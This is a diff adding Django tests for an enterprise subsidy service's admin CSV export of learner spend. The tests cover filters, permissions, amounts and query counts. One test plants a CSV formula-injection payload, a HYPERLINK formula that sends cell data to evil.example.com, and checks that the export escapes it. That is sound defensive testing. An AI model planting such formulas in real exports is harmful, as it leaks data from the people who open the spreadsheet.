@@ -1,25 +1,33 @@
 """
 Tests for the v2 transaction views.
 """
+import csv
 import urllib
 import uuid
-from datetime import timedelta
+from datetime import datetime, timedelta, timezone
 from unittest import mock
 
 import ddt
+from django.db import connection
+from django.test.utils import CaptureQueriesContext
 from edx_rbac.utils import ALL_ACCESS_CONTEXT
 from openedx_ledger.models import LedgerLockAttemptFailed, Transaction, TransactionStateChoices, UnitChoices
-from openedx_ledger.test_utils.factories import ReversalFactory, TransactionFactory
+from openedx_ledger.test_utils.factories import AdjustmentFactory, DepositFactory, ReversalFactory, TransactionFactory
 from requests.exceptions import HTTPError
 from rest_framework import status
 from rest_framework.reverse import reverse
 
+from enterprise_subsidy.apps.api.csv_exports import escape_formula
 from enterprise_subsidy.apps.api.exceptions import ErrorCodes
 from enterprise_subsidy.apps.api.v1.serializers import TransactionCreationError
 from enterprise_subsidy.apps.api.v1.tests.mixins import STATIC_ENTERPRISE_UUID, STATIC_LMS_USER_ID, APITestMixin
 from enterprise_subsidy.apps.core.utils import localized_utcnow
 from enterprise_subsidy.apps.fulfillment.api import FulfillmentException
-from enterprise_subsidy.apps.subsidy.constants import SYSTEM_ENTERPRISE_ADMIN_ROLE, SYSTEM_ENTERPRISE_LEARNER_ROLE
+from enterprise_subsidy.apps.subsidy.constants import (
+    ENTERPRISE_SUBSIDY_LEARNER_ROLE,
+    SYSTEM_ENTERPRISE_ADMIN_ROLE,
+    SYSTEM_ENTERPRISE_LEARNER_ROLE
+)
 from enterprise_subsidy.apps.subsidy.models import ContentNotFoundForCustomerException
 from enterprise_subsidy.apps.subsidy.tests.factories import SubsidyFactory
 
@@ -984,3 +992,311 @@ class TransactionAdminCreateViewTests(APITestBase):
         assert response_data["state"] == TransactionStateChoices.COMMITTED
         expected_quantity = -1 * (requested_price_cents if use_requested_price else canonical_price_cents)
         assert response_data["quantity"] == expected_quantity
+
+
+@ddt.ddt
+class TransactionAdminExportViewTests(APITestMixin):
+    """
+    Tests for the transaction-admin-export view (the Learner Credit "Spent" CSV report).
+    """
+    content_title = 'Intro to Testing'
+    content_key = 'course-v1:edX+test+export'
+    lms_user_email = 'learner@example.com'
+    policy_uuid = uuid.uuid4()
+
+    def setUp(self):
+        super().setUp()
+        self.subsidy = SubsidyFactory(enterprise_customer_uuid=self.enterprise_uuid, starting_balance=100000)
+        self.spend = self._create_spend(quantity=-1050, created=datetime(2024, 1, 10, 15, 30, tzinfo=timezone.utc))
+
+    def _create_spend(self, ledger=None, created=None, **kwargs):
+        """
+        Create a committed learner spend transaction, optionally backdated to ``created``.
+        """
+        transaction_kwargs = {
+            'state': TransactionStateChoices.COMMITTED,
+            'quantity': -1000,
+            'ledger': ledger or self.subsidy.ledger,
+            'lms_user_id': STATIC_LMS_USER_ID,
+            'lms_user_email': self.lms_user_email,
+            'content_key': self.content_key,
+            'content_title': self.content_title,
+            'subsidy_access_policy_uuid': self.policy_uuid,
+            **kwargs,
+        }
+        transaction = TransactionFactory(**transaction_kwargs)
+        if created:
+            Transaction.objects.filter(uuid=transaction.uuid).update(created=created)
+            transaction.refresh_from_db()
+        return transaction
+
+    def _url(self, subsidy_uuid=None):
+        return reverse('api:v2:transaction-admin-export', args=[subsidy_uuid or self.subsidy.uuid])
+
+    def _export(self, subsidy_uuid=None, **params):
+        """
+        Request the export and return (response, rows as dicts).  Rows are empty for non-200 responses.
+        """
+        response = self.client.get(self._url(subsidy_uuid), params)
+        rows = []
+        if response.status_code == status.HTTP_200_OK:
+            content = b''.join(response.streaming_content).decode('utf-8-sig')
+            rows = list(csv.DictReader(content.splitlines()))
+        return response, rows
+
+    def test_admin_exports_csv(self):
+        self.set_up_admin()
+
+        response, rows = self._export()
+
+        assert response.status_code == status.HTTP_200_OK
+        assert response['Content-Type'] == 'text/csv; charset=utf-8'
+        assert response['Content-Disposition'] == f'attachment; filename="spent_report_{self.subsidy.uuid}.csv"'
+        assert rows == [{
+            'Learner Email': self.lms_user_email,
+            'Learner ID': str(STATIC_LMS_USER_ID),
+            'Course Title': self.content_title,
+            'Course Key': self.content_key,
+            'Date Spent (UTC)': '2024-01-10 15:30:00',
+            'Amount Spent': '10.50',
+            'Unit': 'USD',
+            'Status': 'Committed',
+            'Policy UUID': str(self.policy_uuid),
+        }]
+
+    def test_file_starts_with_utf8_bom_and_keeps_non_ascii_text(self):
+        """Excel needs the BOM to read the file as UTF-8 rather than garbling non-ASCII course titles."""
+        self.spend.content_title = 'Introducción a la programación'
+        self.spend.save()
+        self.set_up_admin()
+
+        response = self.client.get(self._url())
+        content = b''.join(response.streaming_content)
+
+        assert content.startswith('\ufeff'.encode('utf-8'))
+        assert 'Introducción a la programación' in content.decode('utf-8-sig')
+
+    def test_only_committed_learner_spend_is_exported(self):
+        """
+        Deposits (including the starting balance), adjustments, and non-committed transactions are ledger transactions
+        too, but aren't learner spend.
+        """
+        DepositFactory(ledger=self.subsidy.ledger, desired_deposit_quantity=50000)
+        AdjustmentFactory(ledger=self.subsidy.ledger, adjustment_quantity=-2000)
+        for state in (TransactionStateChoices.CREATED, TransactionStateChoices.PENDING, TransactionStateChoices.FAILED):
+            self._create_spend(state=state, content_title=f'{state} course')
+        self.set_up_admin()
+
+        _, rows = self._export()
+
+        assert [row['Course Title'] for row in rows] == [self.content_title]
+
+    def test_unpaginated_newest_first_and_refunds_marked(self):
+        reversed_spend = self._create_spend(
+            quantity=-250, content_title='Reversed Course', created=datetime(2024, 1, 11, tzinfo=timezone.utc),
+        )
+        ReversalFactory(transaction=reversed_spend, state=TransactionStateChoices.COMMITTED, quantity=250)
+        for number in range(30):
+            self._create_spend(content_title=f'Extra {number}', created=datetime(2023, 1, 1, tzinfo=timezone.utc))
+        self.set_up_admin()
+
+        _, rows = self._export()
+
+        assert len(rows) == 32
+        assert rows[0]['Course Title'] == 'Reversed Course'
+        assert rows[0]['Amount Spent'] == '2.50'
+        assert rows[0]['Status'] == 'Refunded'
+        assert rows[1]['Course Title'] == self.content_title
+
+    @ddt.data(
+        # The end date is inclusive of the whole day: a 15:30 spend on the end date is included.
+        ({'end_date': '2024-01-10'}, True),
+        ({'end_date': '2024-01-09'}, False),
+        ({'start_date': '2024-01-10'}, True),
+        ({'start_date': '2024-01-11'}, False),
+        ({'start_date': '2024-01-10', 'end_date': '2024-01-10'}, True),
+    )
+    @ddt.unpack
+    def test_date_filters_cover_whole_days(self, params, expect_included):
+        # Spends just either side of 2024-01-10, which must never be included by a filter for that day alone.
+        self._create_spend(content_title='Day before', created=datetime(2024, 1, 9, 23, 59, 59, tzinfo=timezone.utc))
+        self._create_spend(content_title='Day after', created=datetime(2024, 1, 11, 0, 0, 0, tzinfo=timezone.utc))
+        self.set_up_admin()
+
+        response, rows = self._export(**params)
+
+        assert response.status_code == status.HTTP_200_OK
+        assert (self.content_title in [row['Course Title'] for row in rows]) is expect_included
+        if 'start_date' in params and 'end_date' in params:
+            assert [row['Course Title'] for row in rows] == [self.content_title]
+
+    def test_policy_and_search_filters(self):
+        self._create_spend(subsidy_access_policy_uuid=uuid.uuid4(), content_title='Other budget')
+        self._create_spend(content_title='Other search', lms_user_email='someone@example.com')
+        self.set_up_admin()
+
+        _, rows = self._export(subsidy_access_policy_uuid=self.policy_uuid, search=self.content_title)
+
+        assert [row['Course Title'] for row in rows] == [self.content_title]
+
+    @ddt.data(
+        {'start_date': 'not-a-date'},
+        {'end_date': '2024-02-30'},
+        {'end_date': '01/31/2024'},
+        {'start_date': '2024-02-01', 'end_date': '2024-01-31'},
+        {'subsidy_access_policy_uuid': 'abc'},
+        {'enterprise_customer_uuid': 'abc'},
+    )
+    def test_invalid_params_return_bad_request(self, params):
+        self.set_up_admin()
+
+        response, _ = self._export(**params)
+
+        assert response.status_code == status.HTTP_400_BAD_REQUEST
+        assert response['Content-Type'] == 'application/json'
+
+    def test_matching_enterprise_customer_uuid_is_allowed(self):
+        self.set_up_operator()
+
+        response, rows = self._export(enterprise_customer_uuid=self.enterprise_uuid)
+
+        assert response.status_code == status.HTTP_200_OK
+        assert len(rows) == 1
+
+    def test_mismatched_enterprise_customer_uuid_returns_not_found(self):
+        """All-access callers acting for another enterprise can't read this subsidy."""
+        self.set_up_operator()
+
+        response, _ = self._export(enterprise_customer_uuid=uuid.uuid4())
+
+        assert response.status_code == status.HTTP_404_NOT_FOUND
+
+    def test_formula_cells_are_escaped(self):
+        """Learner- and partner-supplied text must not run as a spreadsheet formula."""
+        self.spend.content_title = '=HYPERLINK("https://evil.example.com?"&A1,"Click")'
+        self.spend.lms_user_email = '-2+3@example.com'
+        self.spend.content_key = '@SUM(A1:A2)'
+        self.spend.save()
+        self.set_up_admin()
+
+        _, rows = self._export()
+
+        assert rows[0]['Course Title'] == '\'=HYPERLINK("https://evil.example.com?"&A1,"Click")'
+        assert rows[0]['Learner Email'] == "'-2+3@example.com"
+        assert rows[0]['Course Key'] == "'@SUM(A1:A2)"
+
+    @ddt.data(
+        ('=1+1', "'=1+1"),
+        ('+1', "'+1"),
+        ('-1', "'-1"),
+        ('@A1', "'@A1"),
+        ('\tx', "'\tx"),
+        ('\rx', "'\rx"),
+        ('safe=text', 'safe=text'),
+        ('', ''),
+        (None, None),
+        (42, 42),
+    )
+    @ddt.unpack
+    def test_escape_formula(self, value, expected):
+        assert escape_formula(value) == expected
+
+    def test_seats_ledger_amounts_are_not_converted_from_cents(self):
+        seats_subsidy = SubsidyFactory(
+            enterprise_customer_uuid=self.enterprise_uuid, unit=UnitChoices.SEATS, starting_balance=100,
+        )
+        self._create_spend(ledger=seats_subsidy.ledger, quantity=-2)
+        self.set_up_admin()
+
+        _, rows = self._export(subsidy_uuid=seats_subsidy.uuid)
+
+        assert (rows[0]['Amount Spent'], rows[0]['Unit']) == ('2', 'Seats')
+
+    @ddt.data((0, '0.00'), (-1, '0.01'), (-123456789, '1234567.89'), (500, '-5.00'))
+    @ddt.unpack
+    def test_usd_amounts_are_exact_and_unexpected_credits_are_visible(self, quantity, expected_amount):
+        """Amounts use exact decimal arithmetic, and a positive (credit) quantity shows up as negative spend."""
+        self.spend.quantity = quantity
+        self.spend.save()
+        self.set_up_admin()
+
+        _, rows = self._export()
+
+        assert rows[0]['Amount Spent'] == expected_amount
+
+    def test_operator_can_export(self):
+        self.set_up_operator()
+
+        response, rows = self._export()
+
+        assert response.status_code == status.HTTP_200_OK
+        assert len(rows) == 1
+
+    def test_admin_of_another_enterprise_is_forbidden(self):
+        self.set_up_admin(enterprise_uuids=[str(uuid.uuid4())])
+
+        response, _ = self._export()
+
+        assert response.status_code == status.HTTP_403_FORBIDDEN
+
+    def test_learner_is_forbidden(self):
+        self.set_up_learner()
+
+        response, _ = self._export()
+
+        assert response.status_code == status.HTTP_403_FORBIDDEN
+
+    def test_learner_with_only_database_role_is_forbidden(self):
+        """A learner role from a DB assignment (not the JWT) must not be enough to export everyone's spend."""
+        self.set_up_user()
+        self.set_jwt_cookie([])
+        self.assign_explicit_db_feature_role(feature_role=ENTERPRISE_SUBSIDY_LEARNER_ROLE)
+
+        response, _ = self._export()
+
+        assert response.status_code == status.HTTP_403_FORBIDDEN
+
+    def test_unauthenticated_request_is_unauthorized(self):
+        response, _ = self._export()
+
+        assert response.status_code == status.HTTP_401_UNAUTHORIZED
+
+    def test_nonexistent_subsidy_is_forbidden(self):
+        """Matches the admin list: there's no customer to check permissions against."""
+        self.set_up_admin()
+
+        response, _ = self._export(subsidy_uuid=uuid.uuid4())
+
+        assert response.status_code == status.HTTP_403_FORBIDDEN
+
+    def test_malformed_subsidy_uuid_is_not_found(self):
+        self.set_up_admin()
+
+        response = self.client.get('/api/v2/subsidies/abc/admin/transactions/export/')
+
+        assert response.status_code == status.HTTP_404_NOT_FOUND
+
+    @ddt.data('post', 'put', 'patch', 'delete')
+    def test_other_methods_are_not_allowed(self, method):
+        self.set_up_admin()
+
+        response = getattr(self.client, method)(self._url())
+
+        assert response.status_code == status.HTTP_405_METHOD_NOT_ALLOWED
+
+    def test_query_count_does_not_grow_with_rows(self):
+        """Guards against N+1 queries (e.g. on ledger or reversal) as the report grows."""
+        self.set_up_admin()
+
+        def count_queries():
+            with CaptureQueriesContext(connection) as queries:
+                self._export()
+            return len(queries)
+
+        count_queries()  # The first JWT-authenticated request also updates the user record; exclude that.
+        queries_for_one_row = count_queries()
+        for _ in range(10):
+            reversed_spend = self._create_spend()
+            ReversalFactory(transaction=reversed_spend, state=TransactionStateChoices.COMMITTED, quantity=1000)
+
+        assert count_queries() == queries_for_one_row
